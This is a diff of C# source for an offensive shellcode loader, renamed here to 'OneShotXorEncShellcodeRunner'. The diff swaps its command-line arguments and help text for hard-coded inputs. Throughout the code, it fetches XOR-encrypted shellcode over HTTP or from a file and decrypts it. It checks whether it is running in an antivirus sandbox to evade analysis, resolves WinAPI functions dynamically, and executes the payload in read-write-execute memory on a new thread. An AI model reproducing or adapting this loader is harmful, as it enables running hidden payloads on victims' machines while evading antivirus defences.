@@ -7,7 +7,7 @@ using System.Runtime.InteropServices;
 using System.Text;
 using AVEvasion;
 
-namespace XorEncryptedShellcodeRunner
+namespace OneShotXorEncShellcodeRunner
 {
     public class Program
     {
@@ -458,72 +458,29 @@ namespace XorEncryptedShellcodeRunner
             return false;
         }
 
-        // Show-Usage functions
-        public static void PrintUsage()
-        {
-            string ProgramName = Process.GetCurrentProcess().ProcessName;
-            Console.WriteLine(string.Format("Usage: {0} <Shellcode_source> <decryption_key> [--skip-av-sandbox-check] [miliseconds]", ProgramName));
-            Console.WriteLine("Use '--help-detailed' for more details");
-            Console.WriteLine("Use '--skip-av-sandbox-check' to skip the AV sandbox detection stage");
-        }
-
-        public static void PrintDetailedHelp()
-        {
-            string Help = @"
-Usage: {0} <Shellcode_source> <decryption_key> [--skip-av-sandbox-check] [miliseconds]
-
-Injects chosen shellcode into an already running process. Provided shellcode MUST BE xor-encrypted, and the decryption key must be provided. No files will be written to the disk.
-
-Arguments
----------
-<Shellcode_source> : Source of the (encrypted) shellcode to use to use.
-Source can be a local file on the local system or any system in the local network, or hosted on an http server (in which case, prepend 'http(s)://' like you would for a web url), or be a Base64 encoded string. Shellcodes (if) downloaded will NOT be written on the disk in any manner whatsoever.
-
-<decryption_key> : Source of the key to use to xor-decrypt the shellcode.
-It can be either a string, a file on the local system or a remote system in the local network, or hosted on an http server (Usage for this is the same as the shellcode source argument above).
-
-[--skip-av-sandbox-check] : Skips the AV sandbox detection stage.
-
-[miliseconds] : Miliseconds to wait for newly spawned thread; default: infinite.";
-            Console.WriteLine(Help);
-        }
-
         // GetLastError wrapper
         private static int GetLastError()
         {
             return Marshal.GetLastWin32Error();
         }
 
-        // Numeric string checker
-        private static bool IsNumeric(string s)
-        {
-            return int.TryParse(s, out int n);
-        }
-
         // Main
-        public static void Main(string[] args)
+        public static void Main()
         {
-            // XorEncryptedShellcodeInjector <Shellcode_source> <key_to_decrypt> [--skip-av-sandbox-check] [miliseconds]  
+            // Inputs for usage
+            Boolean RunAVEvasion = true; // Set to false to skip it
+            string KeySource = ""; // http(s) url OR plaintext OR file location
+            uint TimeToWait = 0xFFFFFFFF; // Time to wait for the new thread of xor-decrypt key
+            string ShellcodeSource = ""; // http(s) url OR file location, leave blank to use shellcode from array           
+            byte[] ShellcodeEncrypted = {}; // Xor-encrypted shellcode array to use
 
-            // Help section
-            string WholeArg = "";
-            for (int i = 0; i < args.Length; i++)
-            {
-                WholeArg += args.GetValue(i);
-            }
-            if (WholeArg.Contains("--help-detailed"))
-            {
-                PrintDetailedHelp();
-                return;
-            }
-            else if ((args.Length < 2) || WholeArg.ToLower().Contains("--help") || WholeArg.ToLower().Contains("-h"))
-            {
-                PrintUsage();
-                return;
-            }
+
+            /////////////////////////////////////////////
+            // DON't MODIFY BELOW THINGS FOR EVERYDAY USE
+            /////////////////////////////////////////////
 
             // Check if running in AV Sandbox
-            if (!WholeArg.Contains("--skip-av-sandbox-check"))
+            if (RunAVEvasion)
             {
                 Console.WriteLine("Checking if running in an AV sandbox...");
                 if (Heuristics.IsRunningInAVSandbox())
@@ -532,53 +489,35 @@ It can be either a string, a file on the local system or a remote system in the 
                 }
             }
 
-            // Parse args
-            string KeySource = args[1];
-            string ShellcodeSource = args[0];
-            uint TimeToWait = 0xFFFFFFFF;
-
-            // Get thread waiting time
-            if(args.Length > 2)
-            {
-                if (IsNumeric(args[2]))
-                {
-                    TimeToWait = uint.Parse(args[2]);
-                }
-                else if (IsNumeric(args[3]))
-                {
-                    TimeToWait = uint.Parse(args[3]);
-                }
-            }
-
             // Get the encrypted shellcode
-            byte[] ShellcodeEncrypted;
-            try
+            if(ShellcodeEncrypted.Length == 0)
             {
-                if (ShellcodeSource.StartsWith("http://") || (ShellcodeSource.StartsWith("https://")))
+                try
                 {
-                    Console.Write("Downloading xor-encrypted shellcode: ");
-                    WebClient WC = new WebClient();
-                    ShellcodeEncrypted = WC.DownloadData(ShellcodeSource);
-                    Console.Write("DONE !");
+                    if (ShellcodeSource.StartsWith("http://") || (ShellcodeSource.StartsWith("https://")))
+                    {
+                        Console.Write("Downloading xor-encrypted shellcode: ");
+                        WebClient WC = new WebClient();
+                        ShellcodeEncrypted = WC.DownloadData(ShellcodeSource);
+                        Console.Write("DONE !");
+                    }
+                    else if (File.Exists(ShellcodeSource))
+                    {
+                        Console.Write("Reading xor-encrypted shellcode from file: ");
+                        ShellcodeEncrypted = File.ReadAllBytes(ShellcodeSource);
+                        Console.Write("DONE !");
+                    }
+                    else
+                    {
+                        throw new Exception();
+                    }
+                    Console.WriteLine(string.Format(" ({0} bytes)", ShellcodeEncrypted.Length));
                 }
-                else if (File.Exists(ShellcodeSource))
+                catch
                 {
-                    Console.Write("Reading xor-encrypted shellcode from file: ");
-                    ShellcodeEncrypted = File.ReadAllBytes(ShellcodeSource);
-                    Console.Write("DONE !");
+                    Console.WriteLine("FAILED !");
+                    return;
                 }
-                else
-                {
-                    Console.WriteLine("Converting xor-encrypted shellcode from base64 argument: ");
-                    ShellcodeEncrypted = Convert.FromBase64String(ShellcodeSource);
-                    Console.Write("DONE !");
-                }
-                Console.WriteLine(string.Format(" ({0} bytes)", ShellcodeEncrypted.Length));
-            }
-            catch
-            {
-                Console.WriteLine("FAILED !");
-                return;
             }
 
             // Get the decryption key
@@ -626,14 +565,14 @@ It can be either a string, a file on the local system or a remote system in the 
             // Get necessary WinApi functions
             IntPtr VirtualAllocAddr = IntPtr.Zero, CreateThreadAddr = IntPtr.Zero, WaitForSingleObjectAddr = IntPtr.Zero;
             GetFunctionAddreses(ref VirtualAllocAddr, ref CreateThreadAddr, ref WaitForSingleObjectAddr);
-            if((VirtualAllocAddr == IntPtr.Zero) || (CreateThreadAddr == IntPtr.Zero) || (WaitForSingleObjectAddr == IntPtr.Zero))
+            if ((VirtualAllocAddr == IntPtr.Zero) || (CreateThreadAddr == IntPtr.Zero) || (WaitForSingleObjectAddr == IntPtr.Zero))
             {
                 Console.WriteLine("Failed to derive necessary WinApi functions");
                 return;
             }
             VirtualAllocDelegate VirtualAlloc = (VirtualAllocDelegate)Marshal.GetDelegateForFunctionPointer(VirtualAllocAddr, typeof(VirtualAllocDelegate));
-            CreateThreadDelegate CreateThread = (CreateThreadDelegate)Marshal.GetDelegateForFunctionPointer(CreateThreadAddr,typeof(CreateThreadDelegate));
-            WaitForSingleObjectDelegate WaitForSingleObject = (WaitForSingleObjectDelegate)Marshal.GetDelegateForFunctionPointer(WaitForSingleObjectAddr,typeof(WaitForSingleObjectDelegate));
+            CreateThreadDelegate CreateThread = (CreateThreadDelegate)Marshal.GetDelegateForFunctionPointer(CreateThreadAddr, typeof(CreateThreadDelegate));
+            WaitForSingleObjectDelegate WaitForSingleObject = (WaitForSingleObjectDelegate)Marshal.GetDelegateForFunctionPointer(WaitForSingleObjectAddr, typeof(WaitForSingleObjectDelegate));
 
             // Inject shellcode
             try
@@ -641,7 +580,7 @@ It can be either a string, a file on the local system or a remote system in the 
                 Console.Write("Injecting shellcode in current process: ");
 
                 // Allocate memory for shellcode
-                IntPtr AllocatedMemoryP = VirtualAlloc(IntPtr.Zero, (uint)ShellcodeDecrypted.Length, 0x1000 | 0x2000,0x40);
+                IntPtr AllocatedMemoryP = VirtualAlloc(IntPtr.Zero, (uint)ShellcodeDecrypted.Length, 0x1000 | 0x2000, 0x40);
                 if (AllocatedMemoryP == IntPtr.Zero)
                 {
                     Console.WriteLine(string.Format("Error {0} allocating memory", GetLastError()));
@@ -655,7 +594,7 @@ It can be either a string, a file on the local system or a remote system in the 
                 // Start execution of the shellcode
                 Console.Write("Running shellcode: ");
                 IntPtr NewThreadH = CreateThread(IntPtr.Zero, 0, AllocatedMemoryP, IntPtr.Zero, 0, IntPtr.Zero);
-                if(NewThreadH == IntPtr.Zero)
+                if (NewThreadH == IntPtr.Zero)
                 {
                     Console.WriteLine(string.Format("Error {0} creating new thread", GetLastError()));
                     return;
@@ -663,13 +602,13 @@ It can be either a string, a file on the local system or a remote system in the 
                 Console.WriteLine("DONE");
 
                 // Wait for thread
-                if(TimeToWait == 0xFFFFFFFF)
+                if (TimeToWait == 0xFFFFFFFF)
                 {
                     Console.WriteLine("Waiting indefinitely for newly spawned thread...");
                 }
                 else
                 {
-                    Console.WriteLine(string.Format("Waiting {0} miliseconds for newly spawned thread...",TimeToWait));
+                    Console.WriteLine(string.Format("Waiting {0} miliseconds for newly spawned thread...", TimeToWait));
                 }
                 WaitForSingleObject(NewThreadH, TimeToWait);
             }
